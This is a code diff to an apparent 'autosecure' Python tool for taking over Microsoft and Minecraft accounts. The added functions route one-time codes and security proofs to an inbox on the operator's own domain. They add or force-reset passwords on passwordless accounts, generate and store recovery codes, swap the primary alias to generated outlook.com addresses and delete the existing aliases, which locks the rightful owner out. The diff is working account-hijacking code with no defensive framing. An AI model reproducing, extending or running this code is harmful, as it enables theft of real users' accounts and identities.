@@ -251,6 +251,42 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
     return "ok" if profile else "no_java"
 
 
+def _usable_email(value: str | None) -> str | None:
+    text = str(value or "").strip()
+    if not text or "@" not in text:
+        return None
+    if text in ("Couldn't Change!", "Unknown", "N/A", "?", "Failed to Get"):
+        return None
+    return text
+
+
+def _proof_email(ms: dict, *, our_domain: str = "") -> str | None:
+    """Email we can use for SA / OTP. Prefer our inbox; else login Gmail."""
+    our = (our_domain or "").lower().strip()
+    candidates = []
+    for key in ("security_email", "login_security_email", "email", "original_email"):
+        val = _usable_email(ms.get(key))
+        if val:
+            candidates.append(val)
+    if our:
+        for val in candidates:
+            if val.lower().endswith(f"@{our}"):
+                return val
+    return candidates[0] if candidates else None
+
+
+def _can_read_inbox(email: str | None, our_domain: str) -> bool:
+    val = _usable_email(email)
+    if not val or not our_domain:
+        return False
+    return val.lower().endswith(f"@{our_domain.lower().strip()}")
+
+
+def _password_unset(value: str | None) -> bool:
+    text = str(value or "").strip()
+    return (not text) or text in ("Couldn't Change!", "Unknown", "N/A", "?", "Failed")
+
+
 def _is_autosecure_sunny_primary(email: str | None) -> bool:
     """True if primary is already an autosecure-generated sunny*@outlook.com."""
     text = str(email or "").strip().lower()
@@ -455,11 +491,16 @@ async def secure(
         # Already-sunny re-secures: skip i5600 entirely (MS rejects GOTC with 203/204).
         already_sunny = _is_autosecure_sunny_primary(ms.get("email"))
         skip_i5600 = has_recovery and (not replace_alias or already_sunny)
+        proof_for_otp = _proof_email(ms, our_domain=domain)
+        # Never send Gmail / login-as-proof into GetOneTimeCode — we cannot read it.
+        sec_for_proofs = proof_for_otp if _can_read_inbox(proof_for_otp, domain) else None
+        if not sec_for_proofs and _password_unset(i5600_password):
+            skip_i5600 = True
         security_parameters = json.loads(
             await security_information(
                 session,
-                security_email=ms.get("security_email"),
-                account_email=ms.get("email"),
+                security_email=sec_for_proofs,
+                account_email=ms.get("email") or ms.get("original_email"),
                 password=i5600_password,
                 skip_i5600_otp=skip_i5600,
             )
@@ -480,7 +521,10 @@ async def secure(
             or "i5600" in msg
             or "proofs page" in msg
         )
-        if abuse_blocked or (has_recovery and i5600_blocked):
+        passwordless = _password_unset(ms.get("password")) and not has_recovery
+        if abuse_blocked or (has_recovery and i5600_blocked) or (
+            passwordless and i5600_blocked
+        ):
             log.warning(
                 "security_information soft-skip after recover for %s: %s",
                 ms.get("email"),
@@ -514,6 +558,11 @@ async def secure(
             encryptedNetID = security_parameters["WLXAccount"]["manageProofs"]["encryptedNetId"]
         except (KeyError, TypeError):
             encryptedNetID = None
+        if not encryptedNetID:
+            from securing.utils.security.change_password import _walk_encrypted_net_id
+
+            encryptedNetID = _walk_encrypted_net_id(security_parameters)
+        if not encryptedNetID:
             log.warning("security_parameters missing manageProofs.encryptedNetId")
 
     if recovery or not has_recovery:
@@ -536,6 +585,83 @@ async def secure(
         print(f"[+] - Keeping existing recovery code from recovery flow")
 
     print(f"[+] - Got Recovery Code | {recovery_code}")
+
+    # Passwordless Gmail / NOPASSWORD: RecoverUser never runs without an RC,
+    # and names/manage has no canary until a password exists. Add one from
+    # manage addPassword.postTicket while the OTP login session is still live.
+    ms_now = account_info.get("microsoft") or {}
+    if (
+        not minecon
+        and _password_unset(ms_now.get("password"))
+        and (
+            not recovery_code
+            or recovery_code in ("Couldn't Change!", "Failed to generate")
+        )
+    ):
+        from securing.utils.security.change_password import (
+            add_password_passwordless,
+            _walk_encrypted_net_id,
+        )
+        from securing.utils.security.password_gen import generate_ms_password
+
+        new_pwd = generate_ms_password(14)
+        print("[~] - No recovery code / password — trying passwordless AddPassword")
+        try:
+            added = await add_password_passwordless(
+                session,
+                new_pwd,
+                security_parameters=security_parameters,
+            )
+        except Exception:
+            log.exception("add_password_passwordless crashed")
+            added = False
+        if added:
+            account_info["microsoft"]["password"] = new_pwd
+            print("[+] - Password added on passwordless account")
+            if not encryptedNetID:
+                try:
+                    import re as _re
+
+                    manage = await session.get(
+                        "https://account.live.com/proofs/Manage",
+                        headers={"host": "account.live.com"},
+                        follow_redirects=True,
+                    )
+                    t0_m = _re.search(
+                        r"var\s+t0\s*=\s*(\{.+?\});", manage.text or "", _re.S
+                    )
+                    if t0_m:
+                        encryptedNetID = _walk_encrypted_net_id(
+                            json.loads(t0_m.group(1))
+                        )
+                except Exception:
+                    log.warning("encryptedNetId refresh after AddPassword failed", exc_info=True)
+            if encryptedNetID and apicanary:
+                try:
+                    generated_code = await get_recovery_code(
+                        session, apicanary, encryptedNetID
+                    )
+                    if generated_code:
+                        recovery_code = generated_code
+                        account_info["microsoft"]["recovery_code"] = recovery_code
+                        print(f"[+] - Recovery code after AddPassword | {recovery_code}")
+                except Exception:
+                    log.warning("get_recovery_code after AddPassword failed", exc_info=True)
+        else:
+            proof = _proof_email(ms_now, our_domain=domain)
+            if _can_read_inbox(proof, domain):
+                from securing.utils.security.force_password import force_password_via_otp
+
+                print("[~] - AddPassword missed — OTP ResetPassword via our inbox")
+                forced, ok = await force_password_via_otp(
+                    email=str(ms_now.get("email") or main_email or ""),
+                    security_email=proof,
+                    preferred_password=new_pwd,
+                    session=session,
+                )
+                if ok:
+                    account_info["microsoft"]["password"] = forced
+                    print("[+] - Password set via security-email OTP")
 
     if minecon:
         account_info["microsoft"]["email"] = main_email or account_info["microsoft"]["email"]
@@ -654,13 +780,19 @@ async def secure(
                             apicanary = fresh
                     except Exception:
                         pass
+                    ms_live = account_info.get("microsoft") or {}
+                    proof = _proof_email(ms_live, our_domain=domain)
                     changed = await change_primary_alias(
                         session,
                         primaryEmail,
                         apicanary,
-                        security_email=ms.get("security_email"),
-                        account_email=ms.get("original_email") or ms.get("email") or main_email,
-                        password=ms.get("password"),
+                        security_email=proof,
+                        account_email=(
+                            ms_live.get("original_email")
+                            or ms_live.get("email")
+                            or main_email
+                        ),
+                        password=ms_live.get("password"),
                     )
                     if changed:
                         account_info["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
@@ -829,7 +961,7 @@ async def secure(
             await delete_aliases(
                 session,
                 keep_email=ms_now.get("email"),
-                security_email=ms_now.get("security_email"),
+                security_email=_proof_email(ms_now, our_domain=domain),
                 account_email=ms_now.get("original_email") or ms_now.get("email"),
                 password=strip_unverified(ms_now.get("password")),
             )
